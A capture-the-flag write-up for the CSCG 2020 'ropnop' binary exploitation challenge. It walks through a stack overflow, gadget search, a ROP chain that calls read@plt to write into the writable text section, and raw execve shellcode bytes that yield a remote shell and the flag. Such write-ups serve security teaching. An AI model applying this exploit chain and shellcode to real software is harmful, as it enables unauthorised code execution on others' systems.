# Ropnop

Ropnop was a pwn challenge in the CSCG 2020.
We are given a binary and its source. The source defines three interesting
functions.

```c
void gadget_shop() {
	// look at all these cool gadgets
	__asm__("syscall; ret");
	__asm__("pop %rax; ret");
	__asm__("pop %rdi; ret");
	__asm__("pop %rsi; ret");
	__asm__("pop %rdx; ret");
}
```

```c
void ropnop() {
	unsigned char *start = &__executable_start;
	unsigned char *end = &etext;
	printf("[defusing returns] start: %p - end: %p\n", start, end);
	mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);
	unsigned char *p = start;
	while (p != end) {
		// if we encounter a ret instruction, replace it with nop!
		if (*p == 0xc3)
			*p = 0x90;
		p++;
	}
}
```

```c
int main(void) {
	init_buffering();
	ropnop();
	int* buffer = (int*)&buffer;
	read(0, buffer, 0x1337);
	return 0;
}
```
`gadget_shop` is never called and is only there for (like the name says) [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)-gadgets.
`ropnop` is an interesting function. It makes the whole text section read-write-executable and loops over every byte in the text section, and replaces all `0xc3` bytes with `0x90`. This has the effect, that every return optcode is replaced by an nop optcode. I assume that, that should prevent ROP attacks. But it also clobbers the normal function of ret instructions, which seems very stupid to do. Also the text section is still writable after it is called.
`main` calls `ropnop`, which is supposed to prevent ROP and then lets us overwrite the stack.

I was also a bit confused about the ropnop function, because it replaces all ret optcodes, which means if the `ropnop` is done and tries to return, this optcode is a nop which makes the function not return and execute the bytes after it in the binary.

But this assumption is wrong, because the code used to overwrite the code, overwrites itself. This is a bit confusing, but I will explain it.

Before the start of the program, the ropnop function looks like this:

```
0x0000000000001200 <+0>:     push   rbp
0x0000000000001201 <+1>:     mov    rbp,rsp
0x0000000000001204 <+4>:     sub    rsp,0x20
0x0000000000001208 <+8>:     lea    rax,[rip+0x166]        # 0x1375
0x000000000000120f <+15>:    lea    rcx,[rip+0xffffffffffffedea]        # 0x0
0x0000000000001216 <+22>:    mov    QWORD PTR [rbp-0x8],rcx
0x000000000000121a <+26>:    mov    QWORD PTR [rbp-0x10],rax
0x000000000000121e <+30>:    mov    rsi,QWORD PTR [rbp-0x8]
0x0000000000001222 <+34>:    mov    rdx,QWORD PTR [rbp-0x10]
0x0000000000001226 <+38>:    lea    rdi,[rip+0xdd7]        # 0x2004
0x000000000000122d <+45>:    mov    al,0x0
0x000000000000122f <+47>:    call   0x1030 <printf@plt>
0x0000000000001234 <+52>:    mov    rdi,QWORD PTR [rbp-0x8]
0x0000000000001238 <+56>:    mov    rcx,QWORD PTR [rbp-0x10]
0x000000000000123c <+60>:    mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000001240 <+64>:    sub    rcx,rdx
0x0000000000001243 <+67>:    mov    rsi,rcx
0x0000000000001246 <+70>:    mov    edx,0x7
0x000000000000124b <+75>:    mov    DWORD PTR [rbp-0x1c],eax
0x000000000000124e <+78>:    call   0x1060 <mprotect@plt>
0x0000000000001253 <+83>:    mov    rcx,QWORD PTR [rbp-0x8]
0x0000000000001257 <+87>:    mov    QWORD PTR [rbp-0x18],rcx
0x000000000000125b <+91>:    mov    rax,QWORD PTR [rbp-0x18]
0x000000000000125f <+95>:    cmp    rax,QWORD PTR [rbp-0x10]
0x0000000000001263 <+99>:    je     0x1296 <ropnop+150>
0x0000000000001269 <+105>:   mov    rax,QWORD PTR [rbp-0x18]
0x000000000000126d <+109>:   movzx  ecx,BYTE PTR [rax]
0x0000000000001270 <+112>:   cmp    ecx,0xc3
0x0000000000001276 <+118>:   jne    0x1283 <ropnop+131>
0x000000000000127c <+124>:   mov    rax,QWORD PTR [rbp-0x18]
0x0000000000001280 <+128>:   mov    BYTE PTR [rax],0x90
0x0000000000001283 <+131>:   mov    rax,QWORD PTR [rbp-0x18]
0x0000000000001287 <+135>:   add    rax,0x1
0x000000000000128d <+141>:   mov    QWORD PTR [rbp-0x18],rax
0x0000000000001291 <+145>:   jmp    0x125b <ropnop+91>
0x0000000000001296 <+150>:   add    rsp,0x20
0x000000000000129a <+154>:   pop    rbp
0x000000000000129b <+155>:   ret  
```

After the ropnop has been ran it looks like, that :

```
0x0000555555555200 <+0>:     push   rbp
0x0000555555555201 <+1>:     mov    rbp,rsp
0x0000555555555204 <+4>:     sub    rsp,0x20
0x0000555555555208 <+8>:     lea    rax,[rip+0x166]        # 0x555555555375
0x000055555555520f <+15>:    lea    rcx,[rip+0xffffffffffffedea]        # 0x555555554000
0x0000555555555216 <+22>:    mov    QWORD PTR [rbp-0x8],rcx
0x000055555555521a <+26>:    mov    QWORD PTR [rbp-0x10],rax
0x000055555555521e <+30>:    mov    rsi,QWORD PTR [rbp-0x8]
0x0000555555555222 <+34>:    mov    rdx,QWORD PTR [rbp-0x10]
0x0000555555555226 <+38>:    lea    rdi,[rip+0xdd7]        # 0x555555556004
0x000055555555522d <+45>:    mov    al,0x0
0x000055555555522f <+47>:    call   0x555555555030 <printf@plt>
0x0000555555555234 <+52>:    mov    rdi,QWORD PTR [rbp-0x8]
0x0000555555555238 <+56>:    mov    rcx,QWORD PTR [rbp-0x10]
0x000055555555523c <+60>:    mov    rdx,QWORD PTR [rbp-0x8]
0x0000555555555240 <+64>:    sub    rcx,rdx
0x0000555555555243 <+67>:    mov    rsi,rcx
0x0000555555555246 <+70>:    mov    edx,0x7
0x000055555555524b <+75>:    mov    DWORD PTR [rbp-0x1c],eax
0x000055555555524e <+78>:    call   0x555555555060 <mprotect@plt>
0x0000555555555253 <+83>:    mov    rcx,QWORD PTR [rbp-0x8]
0x0000555555555257 <+87>:    mov    QWORD PTR [rbp-0x18],rcx
0x000055555555525b <+91>:    mov    rax,QWORD PTR [rbp-0x18]
0x000055555555525f <+95>:    cmp    rax,QWORD PTR [rbp-0x10]
0x0000555555555263 <+99>:    je     0x555555555296 <ropnop+150>
0x0000555555555269 <+105>:   mov    rax,QWORD PTR [rbp-0x18]
0x000055555555526d <+109>:   movzx  ecx,BYTE PTR [rax]
0x0000555555555270 <+112>:   cmp    ecx,0x90
0x0000555555555276 <+118>:   jne    0x555555555283 <ropnop+131>
0x000055555555527c <+124>:   mov    rax,QWORD PTR [rbp-0x18]
0x0000555555555280 <+128>:   mov    BYTE PTR [rax],0x90
0x0000555555555283 <+131>:   mov    rax,QWORD PTR [rbp-0x18]
0x0000555555555287 <+135>:   add    rax,0x1
0x000055555555528d <+141>:   mov    QWORD PTR [rbp-0x18],rax
0x0000555555555291 <+145>:   jmp    0x55555555525b <ropnop+91>
0x0000555555555296 <+150>:   add    rsp,0x20
0x000055555555529a <+154>:   pop    rbp
0x000055555555529b <+155>:   ret
```

The difference is, that the cmp instruction, that compares the current byte with `0xc3`, got overwritten and is now a cmp instruction, that compares the byte to `0x90`.

```diff
28c28
< cmp    ecx,0xc3
---
> cmp    ecx,0x90
```

So essentially everything after this compare is not modified, because `0x90` will be replaced with `0x90`

But before we care about that we first have to get our ropchain working. The [pwntools](https://pypi.org/project/pwntools/) tool cyclic is very useful in this case.

```python
from pwn import *

p = process("./ropnop")

input() # delay the script to start gdb

p.sendline(cyclic(50))

p.interactive()

```

GDB reports:

```
0x000055dc480c12e1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 RAX  0x0
 RBX  0x55dc480c12f0 (__libc_csu_init) ◂— endbr64  /* 0x8d4c5741fa1e0ff3 */
 RCX  0x0
 RDX  0x1337
 RDI  0x0
 RSI  0x7ffe44698560 ◂— 0x6161616261616161 ('aaaabaaa')
 R8   0x0
 R9   0x3f
 R10  0x55dc480c04a0 ◂— jb     0x55dc480c0507 /* 0x6474730064616572; 'read' */
 R11  0x246
 R12  0x55dc480c1070 (_start) ◂— endbr64  /* 0x8949ed31fa1e0ff3 */
 R13  0x7ffe44698660 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161616661616165 ('eaaafaaa')
 RSP  0x7ffe44698578 ◂— 0x6161616861616167 ('gaaahaaa')
 RIP  0x55dc480c12e1 (main+65) ◂— ret     /* 0x841f0f2e66c3 */
───────────────────────────────────────────[ DISASM ]───────────────────────────────────────────
 ► 0x55dc480c12e1 <main+65>    ret    <0x6161616861616167>
```
`rsp` points to an address containing `0x6161616861616167 (gaaahaaa)`. The program now tries to return to this address, but because there is no valid memory at `0x6161616861616167` we get a segfault.

With the `cyclic_find` function we can calculate the offset to our input:
```python
...
p.sendline(b"A" * cyclic_find(b'gaaa') + b"XXXX")

...
```
We now control the instruction pointer, but the ropgadgets created by `gadget_shop` were invalidated. So we need to find other gadgets. The program kindly prints the start address of the text section, so we only need the offset in the text section to get a valid address.  [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) is a cool tool to do exactly that.
It has a command line option (`--range start-end`), with which you can set where it should start searching for gadgets. We know that we can only use gadgets after the end of the `ropnop` function.

```
pwndbg> disassemble ropnop
Dump of assembler code for function ropnop:
...
0x00005605c207729a <+154>:   pop    rbp
0x00005605c207729b <+155>:   ret
```
The end of ropnop has the address `0x00005605c207729b` which is an offset of `0x00005605c207729b - 0x5605c2076000 = 0x129b`. The length of the text section is `0x2000`. That makes our ROPgadget command :
```bash
$ ROPgadget --binary ropnop --range 0x129b-0x2000
Gadgets information
============================================================
0x000000000000135c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000000135e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000000012dd : add esp, 0x20 ; pop rbp ; ret
0x0000000000001371 : add esp, 8 ; ret
0x00000000000012dc : add rsp, 0x20 ; pop rbp ; ret
0x0000000000001370 : add rsp, 8 ; ret
0x0000000000001363 : cli ; ret
0x000000000000136b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000001360 : endbr64 ; ret
0x000000000000133c : fisttp word ptr [rax - 0x7d] ; ret
0x00000000000012da : mov eax, ecx ; add rsp, 0x20 ; pop rbp ; ret
0x000000000000134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000000134e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001350 : pop r14 ; pop r15 ; ret
0x0000000000001352 : pop r15 ; ret
0x000000000000134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000000134f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000012e0 : pop rbp ; ret
0x0000000000001353 : pop rdi ; ret
0x0000000000001351 : pop rsi ; pop r15 ; ret
0x000000000000134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000000129b : ret
0x000000000000136d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000000136c : sub rsp, 8 ; add rsp, 8 ; ret

Unique gadgets found: 24
```
That are not that many ropgadgets and I was stuck here for a long time, until I revisited the code and remembered, that the `ropnop` function marked the hole text section writeable. So we somehow need to write our code somewhere and then jump to that address. The last step is easy: we only need to append that address to our ropchain. But the first part is a bit tricky, but we can use the libc function `read` to do that. And we are lucky because the main function calls `read` right before we get rip control. That means, that a lot of setup for the function is already done and we only need to alter a few values. In fact we only need to change the `buf` argument, which is stored in the `rsi` register. And to our luck we have got a pop-rsi gadgets in the reachable ones :
```
0x0000000000001351 : pop rsi ; pop r15 ; ret
```
This also pops r15, but this register is not important for the function call.

Now after we have popped the `buf` argument. We now need to call the read function itself. We don't know the address of the read function in libc, but we can use the `read@plt` function, of which we can calculate the address by using the start of the text section. Offset : `0x55fd12ced040 - 0x55fd12cec000 = 0x1040`

```python
...

popRSI = start + 0x0000000000001351
new_buf = start 	# we just use the text section start as the buffer
read_plt = start + 0x1040


p.sendline(b"A" * cyclic_find(b'gaaa') + p64(popRSI) +
						p64(new_buf) + p64(0) + p64(read_plt) + p64(start))

...
```
* `p64(popRSI)` call the gadget
* `p64(new_buf)` gets popped into RSI by the gadget
* `p64(0)` gets popped into R15 (dont care)
* `p64(read_plt)` call the read function
* `p64(start)` jump to the start of text

That works! We now need to input the shellcode we want to use to be executed.
For that I just used some standard linux 64-bit [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php).


```python
...

p.sendline(b"A" * cyclic_find(b'gaaa') + p64(popRSI) +
						p64(new_buf) + p64(0) + p64(read_plt) + p64(start))

input()
p.sendline(bytes.fromhex("31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"));

...
```

This works both locally and remotely for me:

```bash
$ python pwnit_2.py
[+] Opening connection to hax1.allesctf.net on port 9300: Done


[*] Switching to interactive mode
$ cat flag
CSCG{s3lf_m0d1fy1ng_c0dez!}
$ cat meme.jpg | base64 -w0
/9j/4AAQSk...R/rj/2Q==
$
[*] Interrupted
$ echo "/9j/4AAQSk...R/rj/2Q==" > meme.base64
$ cat meme.base64 | base64 -d > meme.jpg
```
![](https://raw.githubusercontent.com/Nayos1337/cscg2020/master/pwn/ropnop/meme.jpg)
